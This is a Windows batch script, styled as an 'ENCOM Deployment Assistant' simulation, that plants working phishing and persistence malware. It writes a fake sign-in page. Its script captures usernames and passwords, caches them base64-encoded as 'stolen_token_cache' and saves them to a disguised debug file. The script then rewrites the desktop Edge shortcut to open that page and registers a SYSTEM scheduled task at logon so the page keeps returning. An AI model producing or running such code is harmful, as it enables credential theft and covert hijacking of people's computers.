@echo off
title ENCOM Deployment Assistant
echo [+] Initializing Deployment Simulation Layer...

:: ----------------------------------------------------
:: STEP 1: Deploy the Self-Contained Fake Login Page
:: ----------------------------------------------------
set WEB_PATH=C:\Users\Public\Documents\login.html
echo [+] Deploying local credential harvester to %WEB_PATH%...

(
echo ^<!DOCTYPE html^>
echo ^<html lang="en"^>
echo ^<head^>
echo     ^<meta charset="UTF-8"^>
echo     ^<title^>ENCOM OS-12 // Terminal Sign-In^</title^>
echo     ^<style^>
echo         body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 90vh; margin: 0; }
echo         .box { width: 400px; padding: 30px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: center; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
echo         input[type="text"], input[type="password"] { width: 100%%; padding: 10px; background: #040c1a; border: 1px solid #4facfe; color: #fff; margin-bottom: 20px; box-sizing: border-box; }
echo         button { background: #00f2fe; color: #020208; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%%; text-transform: uppercase; }
echo         button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
echo     ^</style^>
echo ^</head^>
echo ^<body^>
echo ^<div class="box"^>
echo     ^<h2^>Grid Node Authentication^</h2^>
echo     ^<p^>INTERNAL WORKSTATION ACCESS ONLY^</p^>
echo     ^<form onsubmit="harvestCredentials(event)"^>
echo         ^<input type="text" id="u" placeholder="IDENTITY HANDLE" required autocomplete="off"^>
echo         ^<input type="password" id="p" placeholder="ACCESS TOKEN" required^>
echo         ^<button type="submit"^>Establish Handshake^</button^>
echo     ^</form^>
echo ^</div^>
echo ^<script^>
echo function harvestCredentials(event) {
echo     event.preventDefault();
echo     const username = document.getElementById('u').value;
echo     const password = document.getElementById('p').value;
echo     const logData = `[HARVEST CAPTURE] USER: ${username} | PASS: ${password}\n`;
echo     localStorage.setItem('stolen_token_cache', btoa(logData));
echo     const blob = new Blob([logData], { type: 'text/plain' });
echo     const link = document.createElement('a');
echo     link.href = window.URL.createObjectURL(blob);
echo     link.download = 'encom_session_debug.txt';
echo     document.body.appendChild(link);
echo     link.click();
echo     document.body.removeChild(link);
echo     alert("CRITICAL LINK ERROR: Connection timeout. Redirecting to backup terminal node...");
echo }
echo ^</script^>
echo ^</body^>
echo ^</html^>
) > "%WEB_PATH%"

:: ----------------------------------------------------
:: STEP 2: Hijack the Desktop Shortcut via PowerShell
:: ----------------------------------------------------
echo [+] Modifying User Desktop Application Shortcuts...

powershell -NoProfile -Command ^
    "$Shell = New-Object -ComObject WScript.Shell; " ^
    "$ShortcutPath = [System.IO.Path]::Combine([Environment]::GetFolderPath('Desktop'), 'Microsoft Edge.lnk'); " ^
    "if (Test-Path $ShortcutPath) { " ^
    "   $Shortcut = $Shell.CreateShortcut($ShortcutPath); " ^
    "   $Shortcut.TargetPath = 'cmd.exe'; " ^
    "   $Shortcut.Arguments = '/c start msedge.exe file:///C:/Users/Public/Documents/login.html'; " ^
    "   $Shortcut.Save(); " ^
    "   Write-Output '    - Edge shortcut successfully hijacked.'; " ^
    "} else { " ^
    "   Write-Output '    - Edge shortcut not found on Desktop. Skipping shortcut hijack.'; " ^
    "}"

:: ----------------------------------------------------
:: STEP 3: Register Persistence via Scheduled Task
:: ----------------------------------------------------
echo [+] Setting up persistent system configuration...

schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start msedge file:///C:/Users/Public/Documents/login.html" /sc onlogon /ru "SYSTEM" /f >nul 2>&1

if %errorlevel% equ 0 (
    echo     - Scheduled task 'EncomGridSync' registered successfully.
) else (
    echo     [!] Warning: Access denied creating scheduled task. (Requires Administrator shell)
)

echo.
echo [+] Execution block complete. Simulation assets deployed.
pause
